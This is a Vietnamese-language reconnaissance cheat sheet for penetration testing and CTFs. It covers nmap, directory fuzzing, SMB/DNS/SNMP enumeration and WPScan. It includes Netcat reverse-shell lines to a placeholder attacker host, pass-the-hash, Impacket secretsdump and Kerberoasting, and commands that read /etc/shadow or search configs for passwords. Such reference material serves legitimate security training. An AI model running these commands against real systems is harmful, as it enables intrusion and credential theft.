# 🔍 Active Reconnaissance Cheat Sheet

> **Lưu ý pháp lý:** Chỉ thực hiện trên hệ thống bạn được phép kiểm tra. Truy cập trái phép là vi phạm pháp luật.

---

## 📌 Mục lục

1. [Ping & ICMP](https://claude.ai/chat/fa7efaac-cd80-4ae6-87f4-9a36183ef853#1-ping--icmp)
2. [Traceroute / Tracepath](https://claude.ai/chat/fa7efaac-cd80-4ae6-87f4-9a36183ef853#2-traceroute--tracepath)
3. [Telnet](https://claude.ai/chat/fa7efaac-cd80-4ae6-87f4-9a36183ef853#3-telnet)
4. [Netcat (nc)](https://claude.ai/chat/fa7efaac-cd80-4ae6-87f4-9a36183ef853#4-netcat-nc)
5. [Nmap](https://claude.ai/chat/fa7efaac-cd80-4ae6-87f4-9a36183ef853#5-nmap)
6. [Gobuster / Feroxbuster / ffuf](https://claude.ai/chat/fa7efaac-cd80-4ae6-87f4-9a36183ef853#6-gobuster--feroxbuster--ffuf)
7. [Nikto](https://claude.ai/chat/fa7efaac-cd80-4ae6-87f4-9a36183ef853#7-nikto)
8. [WhatWeb / Wappalyzer](https://claude.ai/chat/fa7efaac-cd80-4ae6-87f4-9a36183ef853#8-whatweb--wappalyzer)
9. [Enum4linux / SMBclient](https://claude.ai/chat/fa7efaac-cd80-4ae6-87f4-9a36183ef853#9-enum4linux--smbclient)
10. [DNSrecon / Dig / Host](https://claude.ai/chat/fa7efaac-cd80-4ae6-87f4-9a36183ef853#10-dnsrecon--dig--host)
11. [Curl & wget](https://claude.ai/chat/fa7efaac-cd80-4ae6-87f4-9a36183ef853#11-curl--wget)
12. [Masscan](https://claude.ai/chat/fa7efaac-cd80-4ae6-87f4-9a36183ef853#12-masscan)
13. [Crackmapexec (CME)](https://claude.ai/chat/fa7efaac-cd80-4ae6-87f4-9a36183ef853#13-crackmapexec-cme)
14. [Evil-WinRM](https://claude.ai/chat/fa7efaac-cd80-4ae6-87f4-9a36183ef853#14-evil-winrm)
15. [Impacket Suite](https://claude.ai/chat/fa7efaac-cd80-4ae6-87f4-9a36183ef853#15-impacket-suite)
16. [SNMP Enumeration](https://claude.ai/chat/fa7efaac-cd80-4ae6-87f4-9a36183ef853#16-snmp-enumeration)
17. [WPScan](https://claude.ai/chat/fa7efaac-cd80-4ae6-87f4-9a36183ef853#17-wpscan)
18. [Tips từ IppSec & cộng đồng](https://claude.ai/chat/fa7efaac-cd80-4ae6-87f4-9a36183ef853#18-tips-t%E1%BB%AB-ippsec--c%E1%BB%99ng-%C4%91%E1%BB%93ng)

---

## 1. Ping & ICMP

```bash
# Kiểm tra host có sống không
ping -c 4 <target>

# Ping sweep một subnet (bash one-liner)
for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i &>/dev/null && echo "192.168.1.$i UP"; done

# Dùng fping để sweep nhanh hơn
fping -a -g 192.168.1.0/24 2>/dev/null

# Tắt ICMP? Dùng TCP ping
nmap -sn -PE --send-ip <target>
```

**Ghi chú:** Windows dùng `ping -n 4`, Linux dùng `ping -c 4`.

---

## 2. Traceroute / Tracepath

```bash
# Linux
traceroute <target>
traceroute -T -p 80 <target>     # TCP SYN thay vì UDP
traceroute -I <target>            # ICMP

# Windows
tracert <target>

# Tracepath (không cần root)
tracepath <target>

# Dùng nmap thay thế
nmap --traceroute -sn <target>
```

---

## 3. Telnet

```bash
# Kiểm tra port có mở không (banner grab)
telnet <target> <port>

# Ví dụ thực tế
telnet 10.10.10.1 80
# Sau đó gõ:
GET / HTTP/1.0
Host: <target>
[Enter x2]

# Kiểm tra SMTP
telnet <target> 25
EHLO test
VRFY root
EXPN admin

# Kiểm tra FTP
telnet <target> 21

# Kiểm tra SSH version
telnet <target> 22
```

---

## 4. Netcat (nc)

```bash
# Banner grab cơ bản
nc -nv <target> <port>

# Quét port (nmap tốt hơn nhưng nc dùng được khi bị hạn chế)
nc -zv <target> 1-1000 2>&1 | grep succeeded

# Lắng nghe (listener)
nc -lvnp 4444

# Reverse shell (victim gọi về attacker)
nc <attacker_ip> 4444 -e /bin/bash          # Linux
nc <attacker_ip> 4444 -e cmd.exe            # Windows

# Chuyển file
# Receiver:
nc -lvnp 4444 > received_file
# Sender:
nc <target> 4444 < file_to_send

# UDP mode
nc -u <target> 161

# Kiểm tra dịch vụ HTTP
echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc <target> 80
```

---

## 5. Nmap

> ⭐ Công cụ số 1 của mọi pentester. IppSec dùng trong hầu hết mọi video.

```bash
# === SCAN CƠ BẢN ===
nmap <target>
nmap -sV -sC <target>                        # Version + Default scripts
nmap -A <target>                              # Aggressive (OS, version, script, traceroute)
nmap -p- <target>                             # All 65535 ports
nmap -p- --min-rate 10000 <target>           # Scan nhanh (IppSec style)

# === PHÁT HIỆN HOST ===
nmap -sn 192.168.1.0/24                       # Ping sweep
nmap -sn -PS22,80,443 192.168.1.0/24         # TCP SYN ping

# === LOẠI SCAN ===
nmap -sS <target>                             # SYN scan (stealth, mặc định khi root)
nmap -sT <target>                             # TCP connect scan
nmap -sU <target>                             # UDP scan
nmap -sU -p 53,67,68,161,162 <target>        # UDP common ports
nmap -sV --version-intensity 9 <target>      # Max version detection

# === OS DETECTION ===
nmap -O <target>
nmap -O --osscan-guess <target>

# === NSE SCRIPTS ===
nmap --script=default <target>
nmap --script=vuln <target>                   # Vulnerability scan
nmap --script=http-enum <target>              # Web enumeration
nmap --script=smb-enum-shares <target>
nmap --script=smb-vuln-ms17-010 <target>     # EternalBlue check
nmap --script=ftp-anon <target> -p 21        # FTP anonymous login
nmap --script=ldap-rootdse <target> -p 389   # LDAP info
nmap --script=banner <target>

# === OUTPUT ===
nmap -oN output.txt <target>                  # Normal
nmap -oX output.xml <target>                  # XML
nmap -oG output.grep <target>                 # Grepable
nmap -oA output <target>                      # Tất cả 3 định dạng (IppSec luôn dùng -oA)

# === BYPASS FIREWALL ===
nmap -f <target>                              # Fragment packets
nmap -D RND:10 <target>                       # Decoy scan
nmap --source-port 53 <target>               # Dùng source port 53
nmap -Pn <target>                             # Bỏ qua host discovery (quan trọng khi ICMP bị block)
nmap --data-length 25 <target>

# === WORKFLOW CỦA IPPSEC ===
# Bước 1: Scan nhanh tất cả port
nmap -p- --min-rate 10000 -oA nmap/allports <target>

# Bước 2: Scan chi tiết port đã tìm thấy
nmap -p 22,80,443 -sV -sC -oA nmap/targeted <target>
```

---

## 6. Gobuster / Feroxbuster / ffuf

> Web directory & DNS brute-forcing — cực kỳ phổ biến trong CTF và HTB.

```bash
# === GOBUSTER ===
# Directory scan
gobuster dir -u http://<target> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Với extension
gobuster dir -u http://<target> -w <wordlist> -x php,html,txt,bak

# DNS subdomain
gobuster dns -d <domain> -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# VHOST
gobuster vhost -u http://<target> -w <wordlist> --append-domain

# === FFUF (nhanh hơn gobuster) ===
# Directory
ffuf -u http://<target>/FUZZ -w <wordlist>

# VHOST
ffuf -u http://<target> -H "Host: FUZZ.<domain>" -w <wordlist> -fs <size>

# POST parameter
ffuf -u http://<target>/login -d "username=FUZZ&password=test" -w <wordlist> -X POST

# Filter theo size/status
ffuf -u http://<target>/FUZZ -w <wordlist> -fc 404 -fs 1234

# === FEROXBUSTER (recursive mặc định) ===
feroxbuster -u http://<target> -w <wordlist>
feroxbuster -u http://<target> -x php,html,txt --depth 3
```

**Wordlists hay dùng (SecLists):**

- `/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt`
- `/usr/share/seclists/Discovery/Web-Content/common.txt`
- `/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`

---

## 7. Nikto

```bash
# Scan cơ bản
nikto -h http://<target>

# Với port cụ thể
nikto -h <target> -p 8080

# HTTPS
nikto -h https://<target> -ssl

# Lưu output
nikto -h http://<target> -output nikto_output.txt

# Tuning (chỉ scan loại cụ thể)
nikto -h http://<target> -Tuning 1     # Interesting files
nikto -h http://<target> -Tuning 4     # XSS
```

---

## 8. WhatWeb / Wappalyzer

```bash
# WhatWeb - fingerprint web technology
whatweb http://<target>
whatweb -v http://<target>                   # Verbose
whatweb -a 3 http://<target>                 # Aggressive
whatweb --log-verbose=output.txt http://<target>

# curl để xem header
curl -I http://<target>
curl -s http://<target> | grep -i "generator\|powered"
```

---

## 9. Enum4linux / SMBclient

> Quan trọng cho Windows/AD boxes trên HTB.

```bash
# === ENUM4LINUX ===
enum4linux -a <target>                        # All enumeration
enum4linux -U <target>                        # Users
enum4linux -S <target>                        # Shares
enum4linux -G <target>                        # Groups
enum4linux -o <target>                        # OS info

# Enum4linux-ng (phiên bản mới hơn)
enum4linux-ng -A <target>

# === SMBCLIENT ===
smbclient -L //<target>                       # List shares (guest)
smbclient -L //<target> -U ""                 # Null session
smbclient //<target>/ShareName -U username
smbclient //<target>/C$ -U Administrator%password

# Trong smbclient:
# ls, get file, put file, cd, pwd

# === SMBMAP ===
smbmap -H <target>
smbmap -H <target> -u anonymous
smbmap -H <target> -u user -p password -R    # Recursive list

# === NMAP SMB SCRIPTS ===
nmap --script smb-enum-users,smb-enum-shares,smb-enum-groups -p 445 <target>
```

---

## 10. DNSrecon / Dig / Host

```bash
# === DIG ===
dig <domain>
dig <domain> ANY
dig <domain> MX
dig <domain> TXT
dig @<nameserver> <domain>
dig axfr <domain> @<nameserver>              # Zone transfer

# === HOST ===
host <domain>
host -t MX <domain>
host -t NS <domain>
host -l <domain> <nameserver>                # Zone transfer

# === DNSRECON ===
dnsrecon -d <domain>
dnsrecon -d <domain> -t axfr                 # Zone transfer
dnsrecon -d <domain> -t brt -D <wordlist>   # Brute force subdomain

# === FIERCE ===
fierce --domain <domain>

# === NSLOOKUP ===
nslookup <domain>
nslookup -type=MX <domain>
nslookup -type=ANY <domain> <nameserver>
```

---

## 11. Curl & wget

```bash
# === CURL ===
curl -v http://<target>                       # Verbose (xem header)
curl -I http://<target>                       # HEAD request
curl -X POST -d "user=admin&pass=test" http://<target>/login
curl -b "cookie=value" http://<target>
curl -H "Host: internal.domain" http://<target>   # Custom header (VHOST)
curl -k https://<target>                      # Ignore SSL
curl -L http://<target>                       # Follow redirects
curl -s http://<target>/robots.txt            # Silent mode
curl --path-as-is http://<target>/../../etc/passwd   # Path traversal test

# Download file
curl -O http://<target>/file.txt
wget http://<target>/file.txt

# === WGET ===
wget -q http://<target>/file -O output       # Quiet download
wget --spider http://<target>                 # Check without downloading
```

---

## 12. Masscan

> Scan nhanh hơn nmap — dùng để scan internet-scale hoặc scan port nhanh.

```bash
# Scan tất cả port
masscan -p1-65535 <target> --rate=1000

# Scan subnet
masscan 192.168.1.0/24 -p80,443,22 --rate=1000

# Output
masscan -p1-65535 <target> --rate=1000 -oG output.grep

# Kết hợp workflow:
# 1. Masscan tìm port mở nhanh
# 2. Nmap scan chi tiết các port đó
masscan -p1-65535 <target> --rate=1000 | awk '/open/{print $4}' | cut -d/ -f1 | tr '\n' ',' | xargs -I{} nmap -p{} -sV -sC <target>
```

---

## 13. Crackmapexec (CME)

> Công cụ swiss-army knife cho Windows/AD — được dùng nhiều trong real engagements.

```bash
# SMB enumeration
cme smb <target>
cme smb <target> -u '' -p ''                 # Null session
cme smb <target> -u user -p password
cme smb 192.168.1.0/24                       # Subnet scan

# Enumerate shares
cme smb <target> -u user -p pass --shares

# Enumerate users
cme smb <target> -u user -p pass --users
cme smb <target> -u user -p pass --groups

# Pass the hash
cme smb <target> -u Administrator -H <NTLM_HASH>

# Execute command
cme smb <target> -u user -p pass -x "whoami"
cme smb <target> -u user -p pass -X "Get-Process"  # PowerShell

# WinRM
cme winrm <target> -u user -p pass
```

---

## 14. Evil-WinRM

```bash
# Kết nối với password
evil-winrm -i <target> -u Administrator -p password

# Kết nối với hash (Pass the Hash)
evil-winrm -i <target> -u Administrator -H <NTLM_HASH>

# Upload/Download file
# Trong evil-winrm:
upload /local/path/file.exe C:\Windows\Temp\file.exe
download C:\Users\user\Desktop\flag.txt

# Dùng với SSL
evil-winrm -i <target> -u user -p pass -S
```

---

## 15. Impacket Suite

> Bộ công cụ Python cực mạnh cho Windows/Active Directory.

```bash
# === PSEXEC ===
impacket-psexec user:password@<target>
impacket-psexec -hashes :NTLM_HASH Administrator@<target>

# === SMBEXEC ===
impacket-smbexec user:password@<target>

# === WMIEXEC ===
impacket-wmiexec user:password@<target>

# === SECRETSDUMP (dump credentials) ===
impacket-secretsdump user:password@<target>
impacket-secretsdump -hashes :HASH user@<target>

# === GETUSERSPNS (Kerberoasting) ===
impacket-GetUserSPNs domain/user:password -dc-ip <DC_IP> -request

# === GETNPUSERS (AS-REP Roasting) ===
impacket-GetNPUsers domain/ -usersfile users.txt -dc-ip <DC_IP>

# === LOOKUPSID ===
impacket-lookupsid user:password@<target>

# === SMBSERVER (chia sẻ file) ===
impacket-smbserver share /path/to/share -smb2support
```

---

## 16. SNMP Enumeration

```bash
# Kiểm tra SNMP
nmap -sU -p 161 <target>
nmap -sU -p 161 --script snmp-info <target>

# === SNMPWALK ===
snmpwalk -v1 -c public <target>
snmpwalk -v2c -c public <target>
snmpwalk -v1 -c public <target> 1.3.6.1.2.1.25.4.2.1.2   # Running processes
snmpwalk -v1 -c public <target> 1.3.6.1.2.1.25.6.3.1.2   # Installed software
snmpwalk -v1 -c public <target> 1.3.6.1.4.1.77.1.2.25    # User accounts

# === ONESIXTYONE (brute force community string) ===
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt <target>

# === SNMPENUM ===
snmp-check <target> -c public
```

---

## 17. WPScan

```bash
# Scan WordPress cơ bản
wpscan --url http://<target>

# Enumerate users
wpscan --url http://<target> -e u

# Enumerate plugins
wpscan --url http://<target> -e ap --plugins-detection aggressive

# Enumerate themes
wpscan --url http://<target> -e at

# Brute force login
wpscan --url http://<target> -U users.txt -P /usr/share/wordlists/rockyou.txt

# Với API token (nhiều thông tin hơn)
wpscan --url http://<target> --api-token <TOKEN> -e vp,vt,u
```

---

## 18. Tips từ IppSec & cộng đồng

### 🎯 IppSec Methodology

```bash
# 1. Luôn lưu nmap output với -oA
mkdir nmap && nmap -p- --min-rate 10000 -oA nmap/allports <target>

# 2. Parse ports từ output
grep open nmap/allports.nmap | cut -d/ -f1 | tr '\n' ',' | sed 's/,$//'

# 3. Targeted scan
nmap -p <ports> -sV -sC -oA nmap/targeted <target>

# 4. Thêm vào /etc/hosts nếu là CTF
echo "<IP>  <hostname>" | sudo tee -a /etc/hosts
```

### 🔥 Các lệnh hay dùng trong thực tế

```bash
# Tìm file có thể write được (Linux)
find / -writable -type f 2>/dev/null | grep -v proc

# Tìm SUID binaries
find / -perm -4000 2>/dev/null

# Check sudo rights
sudo -l

# Liệt kê tất cả service đang chạy
ss -tlnp
netstat -tlnp

# Kiểm tra /etc/passwd và /etc/shadow
cat /etc/passwd | grep -v nologin
cat /etc/shadow 2>/dev/null

# Tìm password trong file config
grep -r "password\|passwd\|secret\|key" /etc/ 2>/dev/null
```

### 📋 Checklist Active Recon

|Bước|Hành động|Công cụ|
|---|---|---|
|1|Host discovery|`nmap -sn`, `fping`|
|2|Port scan (nhanh)|`masscan`, `nmap -p-`|
|3|Service detection|`nmap -sV -sC`|
|4|Web enumeration|`gobuster`, `ffuf`, `nikto`|
|5|SMB/Windows|`enum4linux`, `smbclient`, `cme`|
|6|DNS|`dnsrecon`, `dig axfr`|
|7|SNMP|`snmpwalk`, `onesixtyone`|
|8|Banner grab|`nc`, `telnet`, `curl`|
|9|Vulnerability check|`nmap --script vuln`|
|10|Credential test|`hydra`, `medusa`|

### 💡 Tips quan trọng

- **Luôn thêm `-Pn`** khi target không response ICMP
- **Check `robots.txt`, `.git/`, `.env`** trên web
- **VHOST enumeration** quan trọng không kém subdomain
- **UDP scan** thường bị bỏ quên nhưng hay có SNMP, DNS, TFTP
- **Screenshot web** bằng `eyewitness` hoặc `gowitness` khi có nhiều target
- **IppSec tip:** Đọc kỹ source code web, comment HTML thường chứa hint

---

## 📚 Wordlists quan trọng

```
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
/usr/share/seclists/Discovery/Web-Content/common.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
```

---

_Cheat sheet tổng hợp cho mục đích học tập, CTF và authorized penetration testing._